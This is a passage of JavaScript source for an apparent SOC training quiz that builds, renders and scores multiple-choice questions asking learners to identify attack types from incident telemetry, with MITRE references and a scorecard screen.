    const fallbackPool = generateDynamicQuestionsFromAttacks("all", 10 - shuffled.length, shuffled.map(q => q.correctAttackId));
    shuffled.push(...fallbackPool);
  }

  // Pick exactly 10 questions
  const selected = shuffled.slice(0, 10);

  // Shuffle options inside each question
  return selected.map(q => {
    return {
      ...q,
      options: shuffleArray([...q.options])
    };
  });
}

/**
 * Dynamically synthesizes high-quality scenario questions from ATTACKS_DATA
 */
function generateDynamicQuestionsFromAttacks(categoryId, countNeeded, excludeIds = []) {
  if (typeof ATTACKS_DATA === "undefined") return [];

  // Filter eligible attacks
  let candidates = ATTACKS_DATA.filter(a => !excludeIds.includes(a.id));
  if (categoryId !== "all") {
    candidates = candidates.filter(a => a.moduleGroup === categoryId || a.category === categoryId);
  }

  if (candidates.length === 0) {
    candidates = ATTACKS_DATA.filter(a => !excludeIds.includes(a.id));
  }

  const generated = [];
  const shuffledCandidates = shuffleArray([...candidates]);

  for (let i = 0; i < Math.min(countNeeded, shuffledCandidates.length); i++) {
    const attack = shuffledCandidates[i];

    // Build scenario prompt from attack summary, anomalies, and target
    const anomalyText = (attack.telemetry && attack.telemetry.anomalies && attack.telemetry.anomalies[0])
      ? attack.telemetry.anomalies[0]
      : attack.summary;

    const scenarioText = `Incident Telemetry Briefing: SOC logs report abnormal adversary activity targeting ${attack.primaryTargets}. Key telemetry observation: "${anomalyText}". The threat actors associated with this behavior are identified as ${attack.threatActors}.`;

    // Pick 3 distractors from same module or random
    const distractors = ATTACKS_DATA
      .filter(a => a.id !== attack.id)
      .sort(() => 0.5 - Math.random())
      .slice(0, 3);

    const options = [
      { id: attack.id, text: `${attack.name}` },
      ...distractors.map(d => ({ id: d.id, text: `${d.name}` }))
    ];

    generated.push({
      id: `dyn_${attack.id}_${Date.now()}_${i}`,
      category: categoryId,
      categoryLabel: attack.module,
      difficulty: attack.severity === "critical" ? "High" : (attack.severity === "high" ? "Medium" : "Easy"),
      scenario: scenarioText,
      question: `Based on this SOC incident signature, identify the threat vector:`,
      correctAttackId: attack.id,
      correctAttackName: attack.name,
      options: shuffleArray(options),
      explanation: `${attack.name} (${attack.mitre}): ${attack.summary}`,
      mitre: attack.mitre
    });
  }

  return generated;
}

function shuffleArray(arr) {
  for (let i = arr.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [arr[i], arr[j]] = [arr[j], arr[i]];
  }
  return arr;
}

// =============================================================================
// 4. QUIZ WORKSPACE RENDERING & USER ACTIONS
// =============================================================================

function startNewQuiz(categoryId) {
  currentQuizCategory = categoryId;
  activeQuizQuestions = generate10Questions(categoryId);
  currentQuestionIndex = 0;
  userAnswers = {};
  quizSubmitted = false;
  missedQuestionPool = [];

  updateQuizNavCategoryLabel();
  updateTopNavQuizScore();
  renderQuizWorkspace();
}

function retryMissedQuestions() {
  if (missedQuestionPool.length === 0) return;

  activeQuizQuestions = shuffleArray([...missedQuestionPool]);
  // If fewer than 10 missed questions, pad to 10 or keep as focused retry
  currentQuestionIndex = 0;
  userAnswers = {};
  quizSubmitted = false;

  renderQuizWorkspace();
}

function renderCategoryFilterPills() {
  const container = document.getElementById("quiz-category-pills");
  if (!container) return;

  container.innerHTML = QUIZ_CATEGORIES.map(cat => {
    const isActive = cat.id === currentQuizCategory;
    return `
      <button class="quiz-category-pill ${isActive ? 'active' : ''}" data-cat="${cat.id}">
        <span>${cat.label}</span>
      </button>
    `;
  }).join("");

  container.querySelectorAll(".quiz-category-pill").forEach(btn => {
    btn.addEventListener("click", () => {
      container.querySelectorAll(".quiz-category-pill").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const catId = btn.getAttribute("data-cat");
      startNewQuiz(catId);
    });
  });
}

function updateQuizNavCategoryLabel() {
  const labelEl = document.getElementById("nav-quiz-category-label");
  const catObj = QUIZ_CATEGORIES.find(c => c.id === currentQuizCategory) || QUIZ_CATEGORIES[0];
  if (labelEl) {
    labelEl.textContent = catObj.label.split("(")[0].trim();
  }
}

function updateTopNavQuizScore() {
  const scoreEl = document.getElementById("nav-quiz-score-pill");
  if (!scoreEl) return;

  const totalAnswered = Object.keys(userAnswers).length;
  let correctCount = 0;
  Object.values(userAnswers).forEach(ans => {
    if (ans.isCorrect) correctCount++;
  });

  scoreEl.textContent = `${correctCount} / ${activeQuizQuestions.length || 10}`;
}

function renderQuizWorkspace() {
  const container = document.getElementById("quiz-workspace-container");
  if (!container) return;

  if (quizSubmitted) {
    renderScorecardScreen(container);
    return;
  }

  const q = activeQuizQuestions[currentQuestionIndex];
  if (!q) return;

  const qNum = currentQuestionIndex + 1;
  const totalQ = activeQuizQuestions.length;
  const progressPercent = Math.round((qNum / totalQ) * 100);

  const existingAnswer = userAnswers[q.id];
  const isAnswered = !!existingAnswer;

  // Render question card
  container.innerHTML = `
    <!-- Quiz HUD Progress Track -->
    <div class="quiz-hud-bar">
      <div class="quiz-hud-meta">
        <div class="quiz-hud-question-tag">
          <span class="quiz-step-badge">QUESTION ${qNum} OF ${totalQ}</span>
          <span class="quiz-domain-tag">${q.categoryLabel.toUpperCase()}</span>
          <span class="quiz-diff-badge ${q.difficulty.toLowerCase()}">${q.difficulty}</span>
        </div>
        <div class="quiz-hud-score-tracker">
          <span>Current Score: <strong>${calculateCurrentScore()} / ${totalQ}</strong></span>
        </div>
      </div>
      <div class="quiz-progress-track">
        <div class="quiz-progress-fill" style="width: ${progressPercent}%;"></div>
      </div>
    </div>

    <!-- Active Question Card -->
    <div class="quiz-question-card">
      <div class="quiz-scenario-box">
        <div class="quiz-scenario-header">
          <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
            <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
            <polyline points="14 2 14 8 20 8"></polyline>
          </svg>
          <span>INCIDENT TELEMETRY & ATTACK DESCRIPTION</span>
        </div>
        <p class="quiz-scenario-text">${escapeHtml(q.scenario)}</p>
      </div>

      <div class="quiz-prompt-row">
        <span class="quiz-target-icon">🎯</span>
        <h3 class="quiz-prompt-title">${escapeHtml(q.question)}</h3>
      </div>

      <!-- Multiple Choice Options Grid -->
      <div class="quiz-options-grid" id="quiz-options-container">
        ${q.options.map((opt, idx) => {
          const letter = String.fromCharCode(65 + idx); // A, B, C, D
          let stateClass = "";
          let iconHtml = `<span class="opt-letter">${letter}</span>`;

          if (isAnswered) {
            if (opt.id === q.correctAttackId) {
              stateClass = "correct-choice";
              iconHtml = `<span class="opt-letter correct">✓</span>`;
            } else if (existingAnswer.selectedOptionId === opt.id) {
              stateClass = "wrong-choice";
              iconHtml = `<span class="opt-letter wrong">✕</span>`;
            } else {
              stateClass = "disabled-choice";
            }
          }

          return `
            <button class="quiz-option-btn ${stateClass}" data-opt-id="${opt.id}" ${isAnswered ? 'disabled' : ''}>
              ${iconHtml}
              <span class="opt-text">${escapeHtml(opt.text)}</span>
            </button>
          `;
        }).join("")}
      </div>

      <!-- Dynamic Feedback & Technical Explanation (Appears after answer) -->
      ${isAnswered ? `
        <div class="quiz-feedback-box ${existingAnswer.isCorrect ? 'feedback-correct' : 'feedback-wrong'}">
          <div class="feedback-header">
            <span class="feedback-status-pill">${existingAnswer.isCorrect ? 'CORRECT IDENTIFICATION' : 'INCORRECT IDENTIFICATION'}</span>
            <span class="feedback-mitre">MITRE: ${escapeHtml(q.mitre)}</span>
          </div>
          <div class="feedback-answer-callout">
            Target Attack: <strong>${escapeHtml(q.correctAttackName)}</strong>
          </div>
          <p class="feedback-explanation">${escapeHtml(q.explanation)}</p>
          <div class="feedback-actions">
            <button class="quiz-jump-learn-btn" onclick="jumpToLearningFromQuiz('${q.correctAttackId}')">
              <svg viewBox="0 0 24 24" width="13" height="13" stroke="currentColor" fill="none" stroke-width="2">
                <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/>
                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>
              </svg>
              <span>Inspect in Learning Mode</span>
            </button>
          </div>
        </div>
      ` : ''}

      <!-- Bottom Navigation Buttons -->
      <div class="quiz-nav-row">
        <button class="quiz-btn secondary-btn" id="btn-quiz-prev" ${currentQuestionIndex === 0 ? 'disabled' : ''}>
          <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
            <polyline points="15 18 9 12 15 6"></polyline>
          </svg>
          <span>Previous</span>
        </button>

        <div style="display: flex; gap: 10px;">
          <button class="quiz-btn reset-round-btn" id="btn-quiz-restart" title="Restart this 10-question set">
            <span>Restart Set</span>
          </button>

          ${currentQuestionIndex < totalQ - 1 ? `
            <button class="quiz-btn primary-btn" id="btn-quiz-next">
              <span>Next Question</span>
              <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
                <polyline points="9 18 15 12 9 6"></polyline>
              </svg>
            </button>
          ` : `
            <button class="quiz-btn finish-btn" id="btn-quiz-finish" ${!isAnswered ? 'disabled' : ''}>
              <span>Complete Exam & View Score</span>
              <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
                <polyline points="22 4 12 14.01 9 11.01"></polyline>
              </svg>
            </button>
          `}
        </div>
      </div>
    </div>
  `;

  // Bind option clicks
  const optionButtons = container.querySelectorAll(".quiz-option-btn");
  optionButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      const selectedId = btn.getAttribute("data-opt-id");
      handleOptionSelected(q, selectedId);
    });
  });

  // Bind navigation buttons
  const prevBtn = document.getElementById("btn-quiz-prev");
  if (prevBtn) {
    prevBtn.addEventListener("click", () => {
      if (currentQuestionIndex > 0) {
        currentQuestionIndex--;
        renderQuizWorkspace();
      }
    });
  }

  const nextBtn = document.getElementById("btn-quiz-next");
  if (nextBtn) {
    nextBtn.addEventListener("click", () => {
      if (currentQuestionIndex < activeQuizQuestions.length - 1) {
        currentQuestionIndex++;
        renderQuizWorkspace();
      }
    });
  }

  const finishBtn = document.getElementById("btn-quiz-finish");
  if (finishBtn) {
    finishBtn.addEventListener("click", () => {
      finishQuiz();
    });
  }

  const restartBtn = document.getElementById("btn-quiz-restart");
  if (restartBtn) {
    restartBtn.addEventListener("click", () => {
      startNewQuiz(currentQuizCategory);
    });
  }
}

function handleOptionSelected(question, selectedOptionId) {
  const isCorrect = (selectedOptionId === question.correctAttackId);

  userAnswers[question.id] = {
    selectedOptionId,
    isCorrect,
    submittedAt: new Date().toISOString()
  };

  updateTopNavQuizScore();
  renderQuizWorkspace();
}

function calculateCurrentScore() {
  let count = 0;
  Object.values(userAnswers).forEach(ans => {
    if (ans.isCorrect) count++;
  });
  return count;
}

function finishQuiz() {
  quizSubmitted = true;

  // Build missed pool for targeted retry
  missedQuestionPool = activeQuizQuestions.filter(q => {
    const ans = userAnswers[q.id];
    return !ans || !ans.isCorrect;
  });

  renderQuizWorkspace();
}

// =============================================================================
// 5. SCORECARD & AUDIT DEBRIEF SCREEN (WITH RE-ATTEMPT OPTIONS)
// =============================================================================

function renderScorecardScreen(container) {
  const total = activeQuizQuestions.length;
  let correct = 0;
  activeQuizQuestions.forEach(q => {
    const ans = userAnswers[q.id];
    if (ans && ans.isCorrect) correct++;
  });

  const percentage = Math.round((correct / total) * 100);

  let grade = "F";
  let gradeClass = "rank-f";
  let verdict = "Novice Defender — Further Training Required";

  if (percentage === 100) {
    grade = "S";
    gradeClass = "rank-s";
    verdict = "Elite Threat Hunter — Perfect 10/10 Score";
  } else if (percentage >= 80) {
    grade = "A";
    gradeClass = "rank-a";
    verdict = "Senior SOC Analyst — Exceptional Threat Identification";
  } else if (percentage >= 70) {
    grade = "B";
    gradeClass = "rank-b";
    verdict = "Certified Security Practitioner — Pass Mark Achieved";
  } else if (percentage >= 50) {
    grade = "C";
    gradeClass = "rank-c";
    verdict = "Associate Defender — Needs Review on Specialized Vectors";
  }

  const currentCatObj = QUIZ_CATEGORIES.find(c => c.id === currentQuizCategory) || QUIZ_CATEGORIES[0];

  container.innerHTML = `
    <div class="quiz-scorecard-card">
      <div class="scorecard-hero-banner">
        <div class="rank-shield ${gradeClass}">
          <span class="rank-letter">${grade}</span>
          <span class="rank-sub">GRADE</span>
        </div>
        <div class="scorecard-title-group">
          <span class="scorecard-kicker">EXAMINATION RESULTS & THREAT IDENTIFICATION SCORECARD</span>
          <h2 class="scorecard-verdict">${verdict}</h2>
          <p class="scorecard-subtitle">
            Exam Category: <strong>${escapeHtml(currentCatObj.label)}</strong> • Questions Tested: <strong>${total}</strong>
          </p>
        </div>
      </div>

      <!-- Key Performance Metrics Grid -->
      <div class="scorecard-stats-grid">
        <div class="score-card-stat">
          <span class="sc-label">Total Score</span>
          <span class="sc-num ${percentage >= 70 ? 'good' : 'bad'}">${correct} / ${total}</span>
          <span class="sc-sub">${percentage}% Accuracy</span>
        </div>
        <div class="score-card-stat">
          <span class="sc-label">Correct Identifications</span>
          <span class="sc-num good">${correct}</span>
          <span class="sc-sub">Neutralized Vectors</span>
        </div>
        <div class="score-card-stat">
          <span class="sc-label">Misidentified Threats</span>
          <span class="sc-num ${missedQuestionPool.length > 0 ? 'bad' : 'good'}">${missedQuestionPool.length}</span>
          <span class="sc-sub">${missedQuestionPool.length === 0 ? 'Flawless Run' : 'Eligible for Retry'}</span>
        </div>
        <div class="score-card-stat">
          <span class="sc-label">Certification Status</span>
          <span class="sc-num ${percentage >= 70 ? 'good' : 'bad'}">${percentage >= 70 ? 'PASSED' : 'RETAKE RECOMMENDED'}</span>
          <span class="sc-sub">70% Pass Threshold</span>
        </div>
      </div>

      <!-- Action Buttons Row (Re-Attempt Options) -->
      <div class="quiz-reattempt-panel">
        <h4 class="reattempt-title">Exam Re-Attempt & Training Options:</h4>
        <div class="reattempt-buttons-row">
          <button class="quiz-btn primary-btn" id="btn-reattempt-new">
            <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
              <path d="M21.5 2v6h-6M21.34 15.57a10 10 0 1 1-.57-8.38l5.67-5.67"/>
            </svg>
            <span>Retake ${escapeHtml(currentCatObj.label.split("(")[0])} (New 10 Questions)</span>
          </button>

          ${missedQuestionPool.length > 0 ? `
            <button class="quiz-btn retry-missed-btn" id="btn-retry-missed">
              <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="8" x2="12" y2="12"></line>
                <line x1="12" y1="16" x2="12.01" y2="16"></line>
              </svg>
              <span>Retry ${missedQuestionPool.length} Missed Question${missedQuestionPool.length > 1 ? 's' : ''} Only</span>
            </button>
          ` : ''}

          <button class="quiz-btn secondary-btn" id="btn-choose-category">
            <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" fill="none" stroke-width="2">
              <polyline points="4 7 4 4 20 4 20 7"></polyline>
              <line x1="9" y1="20" x2="15" y2="20"></line>
              <line x1="12" y1="4" x2="12" y2="20"></line>
            </svg>
            <span>Change Category / Full Exam</span>
          </button>
        </div>
      </div>

      <!-- Detailed 10-Question Audit Breakdown -->
      <div class="quiz-audit-container">
        <h3 class="audit-heading">Detailed 10-Question Forensic Audit Breakdown</h3>
        <div class="quiz-audit-list">
          ${activeQuizQuestions.map((q, idx) => {
            const ans = userAnswers[q.id];
            const isCorr = ans && ans.isCorrect;
            const chosenOpt = ans ? q.options.find(o => o.id === ans.selectedOptionId) : null;
            const chosenText = chosenOpt ? chosenOpt.text : "No Answer Selected";

            return `
              <div class="quiz-audit-card ${isCorr ? 'audit-pass' : 'audit-fail'}">
                <div class="audit-card-header">
                  <div class="audit-num-tag">
                    <span class="audit-badge ${isCorr ? 'pass' : 'fail'}">${isCorr ? '✓ CORRECT' : '✕ MISIDENTIFIED'}</span>
                    <strong>Question 0${idx + 1}</strong>
                    <span class="audit-domain">${q.categoryLabel}</span>
                  </div>
                  <span class="audit-mitre">MITRE: ${escapeHtml(q.mitre)}</span>
                </div>

                <p class="audit-scenario">"${escapeHtml(q.scenario)}"</p>

                <div class="audit-comparison-row">
                  <div class="audit-ans-box your-ans ${isCorr ? 'correct' : 'wrong'}">
                    <span class="ans-label">Your Response:</span>
                    <span class="ans-val">${escapeHtml(chosenText)}</span>
                  </div>
                  <div class="audit-ans-box target-ans">
                    <span class="ans-label">Target Threat Vector:</span>
                    <span class="ans-val">${escapeHtml(q.correctAttackName)}</span>
                  </div>
                </div>

                <p class="audit-explanation">${escapeHtml(q.explanation)}</p>

                <div class="audit-footer-actions">
                  <button class="quiz-jump-learn-btn" onclick="jumpToLearningFromQuiz('${q.correctAttackId}')">
                    <svg viewBox="0 0 24 24" width="12" height="12" stroke="currentColor" fill="none" stroke-width="2">
                      <path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/>
                      <path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/>
                    </svg>
                    <span>Review in Learning Dossier</span>
                  </button>
                </div>
              </div>
            `;
          }).join("")}
        </div>
      </div>
    </div>
  `;

  // Bind Re-Attempt buttons
  const btnNew = document.getElementById("btn-reattempt-new");
  if (btnNew) {
    btnNew.addEventListener("click", () => {
      startNewQuiz(currentQuizCategory);
    });
  }

  const btnRetryMissed = document.getElementById("btn-retry-missed");
  if (btnRetryMissed) {
    btnRetryMissed.addEventListener("click", () => {
      retryMissedQuestions();
    });
  }

  const btnChooseCat = document.getElementById("btn-choose-category");
  if (btnChooseCat) {
    btnChooseCat.addEventListener("click", () => {
      const topPills = document.getElementById("quiz-category-pills");
      if (topPills) {
        topPills.scrollIntoView({ behavior: "smooth", block: "center" });
      }
    });
  }
}

// =============================================================================
// 6. CROSS-NAVIGATION HELPERS
// =============================================================================

function jumpToLearningFromQuiz(attackId) {
  if (typeof switchAppMode === "function") {
    switchAppMode("learning");
  }
  if (typeof loadAttack === "function") {
    loadAttack(attackId);
    window.location.hash = `${attackId}?tab=anatomy&filter=all`;
  }
}

function escapeHtml(text) {
  if (!text) return "";
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

// Global exports
window.initQuiz = initQuiz;
window.startNewQuiz = startNewQuiz;
window.jumpToLearningFromQuiz = jumpToLearningFromQuiz;
